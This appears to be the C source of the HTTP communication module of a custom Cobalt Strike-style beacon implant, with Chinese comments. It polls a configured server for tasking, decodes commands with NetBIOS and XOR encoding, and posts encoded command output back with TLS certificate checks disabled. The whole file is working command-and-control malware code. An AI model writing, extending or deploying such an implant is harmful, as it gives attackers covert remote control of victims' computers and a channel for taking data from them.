#include "Http.h"
#include "Config.h"
#include "Util.h"

#define MAX_HEADER_SIZE 1024

char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
    size_t prefixLen = strlen(prefix);
    size_t suffixLen = strlen(suffix);
    size_t dataLen = strlen(data);

    if (strncmp(data, prefix, prefixLen) == 0 &&
        strncmp(data + (dataLen - suffixLen), suffix, suffixLen) == 0) {
        data[dataLen - suffixLen] = '\0';
        return data + prefixLen;
    }

    return data; 
}

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* responsedatalen) {

    //去除 data= 和 %%
    data = removePrefixAndSuffix(data, Response_prepend, Response_append);

    int data_length = strlen(data);
    unsigned char netbiosKey = 'a'; 
    size_t NetbiosDecodedatalen;

    // NetBIOS 解码
    unsigned char* NetbiosDecodedata = NetbiosDecode((unsigned char*)data, data_length, netbiosKey ,&NetbiosDecodedatalen);

    unsigned char* Error = "Error";

    // 解码结果不符合预期或数据不足
    if (NetbiosDecodedatalen < 5) {
        *responsedatalen = 4;
        return Error;
    }

    // Mask 解码，就是 XOR 罢了
    // 前四字节为 XOR 密钥
    unsigned char key[] = { NetbiosDecodedata[0], NetbiosDecodedata[1], NetbiosDecodedata[2], NetbiosDecodedata[3] };
    int key_length = sizeof(key) / sizeof(key[0]);
    size_t MaskDecodedatalen = NetbiosDecodedatalen - 4;
    unsigned char* MaskDecodedata= MaskDecode((unsigned char*)&NetbiosDecodedata[4], MaskDecodedatalen, key, key_length);

    *responsedatalen = MaskDecodedatalen;

    return MaskDecodedata;
}


unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLength, uint32_t* commandType ,size_t* commandBuflen , size_t* executeCount) {

    // 数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | commandBuf || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
    // commandLen 只是 commandBuf 的长度

    unsigned char* decryptedBuffer;

    if (*executeCount > 0) {

        decryptedBuffer = decryptedBuf + (int)*executeCount;
    }
    else
    {
        decryptedBuffer = decryptedBuf;
    }

    uint8_t commandTypeBytes[4];
    unsigned char* commandTypeBytesStart = decryptedBuffer;
    memcpy(&commandTypeBytes, commandTypeBytesStart, 4);
    *commandType = bigEndianUint32(commandTypeBytes);

    uint8_t commandLenBytes[4];
    unsigned char* commandLenBytessStart = decryptedBuffer + 4;
    memcpy(&commandLenBytes, commandLenBytessStart, 4);
    uint32_t commandLen = bigEndianUint32(commandLenBytes);

    unsigned char* commandBuf = (unsigned char*)malloc(commandLen);
    unsigned char* commandBufStart = decryptedBuffer + 8;
    memcpy(commandBuf, commandBufStart, commandLen);
    
    *totalLength = *totalLength - (4 + 4 + commandLen); // 留下剩下的 command 数据包长度
    *commandBuflen = commandLen;                        // 返回值

    *executeCount = *executeCount + commandLen + 8;

    return commandBuf;
}

unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
    // 这里需要注意，即使服务端没有指令，也会发送一些数据，所以这里返回一定不为空
    // 类似于 data=nihcgakh%%
    // 初始化 WinHttp 会话
    HINTERNET hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        printf("WinHttpOpen failed: %lu", GetLastError());
        exit(1);
    }

    // 连接到服务器
    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);

    if (!hConnect) {
        printf("WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"GET",
        get_path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %lu\n", GetLastError());
        CloseHandle(hSession);
        CloseHandle(hConnect);
        exit(1);
    }

    // 添加请求头
    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, cookie_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("WinHttpSendRequest failed: %lu\n", GetLastError());
        CloseHandle(hSession);
        CloseHandle(hConnect);
        CloseHandle(hRequest);
        exit(1);
    }

    // 接受响应
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("WinHttpReceiveResponse failed: %lu\n", GetLastError());
        CloseHandle(hSession);
        CloseHandle(hConnect);
        CloseHandle(hRequest);
    }

    // 读取响应体数据
    DWORD bytesAvailable;
    DWORD bytesRead;
    unsigned char* responseData = NULL;
    size_t totalSize = 0;
    char buffer[4096];

    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        if (!WinHttpReadData(hRequest, buffer, min(bytesAvailable, sizeof(buffer)), &bytesRead)) {
            fprintf(stderr, "WinHttpReadData failed: %lu\n", GetLastError());
            if (responseData) {
                free(responseData);
            }
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return NULL;
        }

        // 动态调整内存大小
        unsigned char* temp = (unsigned char*)realloc(responseData, totalSize + bytesRead);
        if (!temp) {
            fprintf(stderr, "realloc failed: %lu\n", GetLastError());
            if (responseData) {
                free(responseData);
            }
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return NULL;
        }
        responseData = temp;

        memcpy(responseData + totalSize, buffer, bytesRead);
        totalSize += bytesRead;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *responseSize = totalSize;

    return responseData;
}

unsigned char* makeBeaconIdHeader() {
    int temp = clientID; // beacon id
    int digitCount = 0;  // beacon id 位数
    while (temp != 0) {
        temp /= 10;
        ++digitCount;
    }

    // 计算字符数组的长度，包括负号和终止符号 '\0'
    int charArrayLength = (clientID < 0) ? digitCount + 2 : digitCount + 1;

    // 使用 malloc 动态分配足够的内存来存储转换后的字符串
    unsigned char* CharId = (unsigned char*)malloc(charArrayLength * sizeof(char) - 1);
    if (CharId == NULL) {
        free(CharId);
        exit(1);
    }

    sprintf(CharId, "%d", clientID);
    size_t codelen;
    // xor beacon id
    unsigned char* MaskEncodeid = MaskEncode(CharId, charArrayLength * sizeof(char) - 1, &codelen);

    unsigned char netbiosKey = 'A'; // Replace 'a' with your desired key
    size_t NetbiosEncodeIdlen;
    // NetBios beacon id
    unsigned char* id = NetbiosEncode(MaskEncodeid, strlen(MaskEncodeid), netbiosKey, &NetbiosEncodeIdlen);
    id[NetbiosEncodeIdlen] = '\0';

    char header[] = "User:";
    unsigned char* concatenatedString = (unsigned char*)malloc(strlen(id) + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);

    // User:user=APNDCONJDOOBBMOKDPOB%%
    snprintf(concatenatedString, strlen(id) + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1, "%s%s%s%s", header, Http_post_id_prepend, id, Http_post_id_append);

    free(CharId);

    return concatenatedString;
}

unsigned char* makePostData(unsigned char* buff, size_t Bufflen, int callback) {
    size_t buff_length;
    unsigned char* finalPaket = MakePacket(callback, buff, Bufflen, &buff_length);

    size_t code_length;
    // xor post
    unsigned char* MaskEncodedata = MaskEncode(finalPaket, buff_length, &code_length);
    // base64 post
    unsigned char* data = base64Encode(MaskEncodedata, code_length);

    unsigned char* dataString = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);

    // data = post%%
    // data=kXEmu5FxJvt2mIFuBzc6Z0B/LcirvoW86DBrQeAStEa97ZnOP8ohhvAqzwYtKM7vksTizVK7yXQe6bEsNN8fUGLAGDHlR4Y0%%
    strcpy(dataString, Http_post_client_output_prepend);
    strcat(dataString, data);
    strcat(dataString, Http_post_client_output_append);

    return dataString;
}

VOID POST(unsigned char* buf, size_t Bufflen, int callback) {
    unsigned char* BeaconIdHeader = makeBeaconIdHeader();
    unsigned char* dataString = makePostData(buf, Bufflen, callback);
    size_t dataSize = strlen((char*)dataString);

    wchar_t BeaconIdWideHeader[256];
    MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);

    // 初始化 WinHttp 会话
    HINTERNET hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("WinHttpOpen failed: %lu\n", GetLastError());
        return NULL;
    }

    // 连接到服务器
    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
    if (!hConnect) {
        printf("WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    // 创建 POST 请求
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        post_path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    WinHttpAddRequestHeaders(hRequest, BeaconIdWideHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, server_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, content_type_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // 设置安全标志以忽略证书验证错误
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    // 发送 POST 请求，附带请求体数据
    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0, // 没有额外的请求头
        (LPVOID)dataString, dataSize,     // 请求体数据和长度
        dataSize,                         // 总数据长度
        0)) {
        printf("WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        exit(1);
    }

    free(BeaconIdHeader);
    free(dataString);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
